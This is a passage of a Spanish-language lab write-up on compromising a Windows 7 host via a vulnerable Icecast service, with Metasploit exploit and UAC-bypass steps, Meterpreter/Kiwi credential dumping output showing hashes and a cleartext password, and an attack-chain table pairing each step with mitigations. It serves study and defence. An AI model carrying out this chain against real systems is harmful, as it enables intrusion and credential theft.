    golden_ticket_create      Create a golden kerberos ticket
    kerberos_ticket_list      List all kerberos tickets (unparsed)
    kerberos_ticket_purge     Purge any in-use kerberos tickets
    kerberos_ticket_use       Use a kerberos ticket
    kiwi_cmd                  Execute an arbitrary mimikatz command (unparsed)
    lsa_dump_sam              Dump LSA SAM (unparsed)
    lsa_dump_secrets          Dump LSA secrets (unparsed)
    password_change           Change the password/hash of a user
    wifi_list                 List wifi profiles/creds for the current user
    wifi_list_shared          List shared wifi profiles/creds (requires SYSTEM)
```

para este ataque utilizaremos el comando de `creds_all` para intentar conseguir todas las credenciales de los usuarios 

```bash
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

wdigest credentials
===================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
DARK-PC$  WORKGROUP  (null)
Dark      Dark-PC    Password01!

tspkg credentials
=================

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

kerberos credentials
====================

Username  Domain     Password
--------  ------     --------
(null)    (null)     (null)
Dark      Dark-PC    Password01!
dark-pc$  WORKGROUP  (null)
```

### Conclusión

Gracias a la migración hacia **`spoolsv.exe`** y el uso de la extensión **Kiwi**, fue posible:

- Escalar privilegios al nivel máximo **SYSTEM**.
- Explorar los procesos y privilegios de manera segura.
- Extraer credenciales de usuarios, incluyendo contraseñas en texto claro y hashes, lo cual es fundamental para **post-explotación y auditoría de seguridad** en un entorno controlado de laboratorio.

Este flujo representa un ejemplo completo de cómo combinar **explotación remota**, **escalamiento de privilegios** y **post-explotación con Meterpreter y Mimikatz**, respetando siempre el entorno seguro y autorizado de práctica.


# Cadena de ataque 

| Paso | Descripción                                                    |                                                                                   Herramienta / Comando clave | Objetivo / Por qué                                                                | Resultado / Evidencia                                                                                                                | Mitigación recomendada                                                                                                                        |
| ---- | -------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------: | --------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------- |
| 1    | Reconocimiento externo                                         |                                                                       `nmap -sS -sV -p- -sC -Pn 10.10.39.239` | Detectar puertos y servicios expuestos                                            | OS: Windows 7 SP1 x64; servicio Icecast en `8000/tcp`; RDP, SMB abiertos. (Salida `nmap.txt`)                                        | Minimizar superficie de ataque: cerrar/filtrar servicios innecesarios; parches.                                                               |
| 2    | Búsqueda de exploits disponibles                               |                                                        `searchsploit icecast` / `msfconsole` `search icecast` | Identificar exploits públicos aplicables a Icecast                                | Encontrado `exploit/windows/http/icecast_header` (módulo Metasploit)                                                                 | Mantener inventario de software y aplicar actualizaciones; eliminar servicios sin soporte.                                                    |
| 3    | Explotación remota                                             | Metasploit: `use exploit/windows/http/icecast_header` + payload `windows/meterpreter/reverse_tcp` → `exploit` | Obtener ejecución remota y un payload en memoria                                  | **Meterpreter session 1** abierta (reverse shell al host objetivo).                                                                  | Monitoreo de tráfico saliente; WAF/APT/IDS para tráfico anómalo.                                                                              |
| 4    | Reconocimiento post-explotación inicial                        |                                                                     `systeminfo`, `ps`, `getprivs` (sesión 1) | Recopilar SO, procesos, arquitectura y privilegios actuales                       | SO x64; proceso `Icecast2.exe` (x86) bajo `Dark`; privilegios limitados (usuario local).                                             | Least privilege; evitar ejecución de servicios con privilegios innecesarios.                                                                  |
| 5    | Enumeración de vectores locales                                |                                                                `run post/multi/recon/local_exploit_suggester` | Enumerar exploits locales aplicables según arquitectura/build                     | Listado de módulos aplicables; entre ellos `bypassuac_eventvwr`.                                                                     | Parcheo de sistema y revisión de build/servicios vulnerables; alertas EDR para checks locales.                                                |
| 6    | Escalada UAC local                                             |                                        `use exploit/windows/local/bypassuac_eventvwr` (SESSION=1) → `exploit` | Evadir UAC y ejecutar payload elevado (sin prompt)                                | **Meterpreter session 2** abierta con permisos elevados (evidencia: handler + nueva sesión).                                         | Endurecer UAC, aplicar parches, bloquear vectores de auto-elevación; monitorizar ejecución de utilidades auto-elevadas (p. ej. eventvwr.exe). |
| 7    | Verificación de privilegios y migración a proceso privilegiado |                                         `sessions -i 2`, `getuid`, `getprivs`, `ps`, `migrate -N spoolsv.exe` | Confirmar identidad SYSTEM y ejecutar dentro de proceso x64 que corre como SYSTEM | `getuid` → `NT AUTHORITY\SYSTEM`; `getprivs` muestra privilegios críticos; `spoolsv.exe` identificado y usado como proceso objetivo. | Restringir acceso/ejecución de procesos críticos; monitorizar inyección/migración de procesos.                                                |
| 8    | Carga de herramienta de post-explotación                       |                                                                `meterpreter > load kiwi` (Mimikatz integrado) | Cargar funcionalidad para interactuar con LSA/LSASS en memoria                    | Extensión Kiwi cargada correctamente (`Success.`).                                                                                   | Protección de LSA (LSA Protection, Credential Guard); EDR que detecte técnicas de dumping.                                                    |
| 9    | Extracción de credenciales                                     |                                                                     `meterpreter > creds_all` / comandos kiwi | Recuperar credenciales almacenadas en memoria (hashes / texto claro / tickets)    | Credenciales y hashes recuperados (texto claro y NTLM hashes accesibles en memoria).                                                 | Habilitar mitigaciones (Credential Guard), rotación de credenciales, auditoría y bloqueo de exfiltración.                                     |
| 10   | Impacto y cierre                                               |                                       Consolidación: movimiento lateral, persistencia, exfiltración potencial | Mostrar cómo un servicio vulnerable lleva a compromiso total                      | Compromiso total del host (SYSTEM) y acceso a credenciales que permiten escalado lateral/persistencia.                               | Parcheo prioritario, EDR/IDS/monitorización de comportamiento, políticas de hardening y revisión de servicios expuestos.                      |
|      |                                                                |                                                                                                               |                                                                                   |                                                                                                                                      |                                                                                                                                               |



# Sesiones

| Sesion                               | Usuario / Privilegios | Notas                                                                                                                                             |
| ------------------------------------ | --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------- |
| Sesión 1 (Icecast)                   | `Dark-PC\Dark`        | Privilegios limitados de usuario local, aunque con algunos derechos interesantes (`SeDebugPrivilege`, `SeBackupPrivilege`).                       |
| Sesión 2 (tras `bypassuac_eventvwr`) | `NT AUTHORITY\SYSTEM` | Privilegios completos del sistema. Ahora cualquier acción, como dumping de credenciales o migración a procesos como `spoolsv.exe`, hereda SYSTEM. |